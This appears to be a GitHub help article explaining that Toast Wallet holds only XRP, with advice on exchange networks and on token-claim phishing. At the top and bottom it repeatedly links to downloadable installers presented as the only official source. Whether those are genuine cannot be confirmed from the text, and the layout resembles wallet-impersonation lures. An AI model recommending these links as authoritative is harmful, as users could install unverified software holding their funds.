<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet supported coins: XRP only</h1>

<p align="center">Toast Wallet holds XRP; other coins need their own wallets.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Toast Wallet is a wallet for XRP. The [latest desktop release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) holds, sends and receives XRP on the XRP Ledger. It is not a multi-coin wallet, so Bitcoin, Ethereum and other coins need wallets designed for them. Never send other coins to a Toast address.

## 👀 You'll see this if

- You wonder whether you can store Bitcoin or Ethereum in Toast Wallet.
- You saw tokens on the XRP Ledger and want to know if Toast Wallet manages them.
- An exchange offers to send a different coin to your Toast address.
- A website claims Toast Wallet supports a new token "airdrop".

## 🤔 Why it matters

Each blockchain has its own address format and rules. An XRP address looks like `r` followed by letters and numbers. A Bitcoin or Ethereum address looks completely different and belongs to a different network. Wallets are built for specific networks. Sending a coin to an address on the wrong network usually means it is not received where you expect.

Toast Wallet focuses on doing one thing: XRP. That keeps the app simple, and it means you can trust that any instructions about Toast Wallet are about XRP. Messages telling you to "claim" tokens through your Toast Wallet are a classic phishing hook.

## 🧭 Before you start

List what you hold. If it is XRP, Toast Wallet is a good fit. If it includes other coins, plan to keep those in wallets built for their own networks.

## 🛠️ Fix: use Toast Wallet for the right asset

1. **Use Toast Wallet for XRP.** Receive XRP to your `r` address; see [receive XRP in Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/receive-xrp-in-toast-wallet.md).
2. **Check the network when withdrawing.** On an exchange, choose XRP and the XRP Ledger network before entering your Toast address.
3. **Keep other coins elsewhere.** Bitcoin, Ethereum and other coins need wallets built for those networks.
4. **Ignore token claims.** Toast Wallet does not manage XRP Ledger tokens. Any message about claiming tokens through Toast Wallet is suspicious; see [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md).
5. **Understand the reserve.** Even for XRP, part of each account is locked by the ledger. Read [Toast Wallet XRP reserve explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-xrp-reserve-explained.md).

## 🧩 Real-world example

A user receives an email saying "Toast Wallet holders can claim a new token: connect your wallet here". The link leads to a polished site asking for their six recovery words and backup code. Remembering that Toast Wallet is XRP only and that no genuine claim ever needs those secrets, they delete the email. A friend who entered the details lost their XRP within an hour.

## ⚠️ Common mistakes

- Selecting the wrong network on an exchange when withdrawing to a Toast address.
- Believing token "airdrop" messages addressed to Toast users.
- Assuming every wallet supports every coin.
- Importing keys from other networks into Toast Wallet.

## 🔁 If that did not work

- **You sent a non-XRP coin to your Toast address.** Contact the sending exchange through its official support. Toast Wallet cannot display or move other coins.
- **You expected to see a token balance.** Toast Wallet shows XRP only.
- **A site says your Toast Wallet "needs an upgrade to support tokens".** It is a scam. Updates come only from the official release page.

## 🛡️ Prevention

Double-check the asset and network on every withdrawal. Keep a simple rule: Toast Wallet equals XRP. Treat all token claim messages as suspicious and never connect your wallet secrets to websites.

## 📝 Good to know

Keeping different assets in different wallets is common good practice. It limits the damage if one wallet is ever compromised and makes it easier to understand what you hold. Toast Wallet's single focus on XRP is part of what keeps its screens straightforward: there is one balance, one kind of address and one network to think about.

If you are new to crypto, it can be tempting to look for a single app that does everything. The trade-off is complexity, and complexity creates more places for mistakes. For XRP held on your own computer, a dedicated desktop wallet keeps things clear.

## 🔍 A closer look at networks on exchanges

When you withdraw XRP from an exchange, the form often asks you to choose a network. Some exchanges show more than one option for popular coins. For Toast Wallet, the correct choice is always the XRP Ledger network, sometimes labelled simply XRP. If the address field rejects your Toast address, that is a strong hint that the wrong network or asset is selected.

The same caution applies in the other direction. If you are sending from Toast Wallet to an exchange, make sure the exchange deposit page you copied the address from is the XRP deposit page, not a page for another asset. The guide [transfer XRP from Toast Wallet to Coinbase](https://github.com/Toast-Wallet/learn/blob/main/how-to/transfer-xrp-from-toast-wallet-to-coinbase.md) walks through the full routine with an example exchange.

Taking a moment to read the asset and network names on every form is the single best way to avoid sending funds to the wrong place.

## 🧠 Remember

Toast Wallet equals XRP. Other coins belong in their own wallets, and token claims addressed to Toast users are phishing. Keep that simple rule and you will not lose funds to wrong-network transfers or fake airdrops.

## ❓ FAQ

<details>
<summary>Does Toast Wallet support XRP Ledger tokens?</summary>

No. Toast Wallet is for XRP only.

</details>

<details>
<summary>Can I store Bitcoin in Toast Wallet?</summary>

No. Use a wallet designed for Bitcoin.

</details>

<details>
<summary>Will Toast Wallet add other coins?</summary>

Any changes would appear in an official release. Until then, treat it as XRP only.

</details>

> [!WARNING]
> Token "claims" and "airdrops" for Toast Wallet users are phishing. Never enter your words, passphrase or backup code anywhere online.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Receive XRP in Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/receive-xrp-in-toast-wallet.md) | Share the right address and confirm the payment arrived. |
| [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md) | Fake sites, fake apps and fake recovery tools named and explained. |
| [Toast Wallet XRP reserve explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-xrp-reserve-explained.md) | Why part of the balance is locked by the XRP Ledger. |
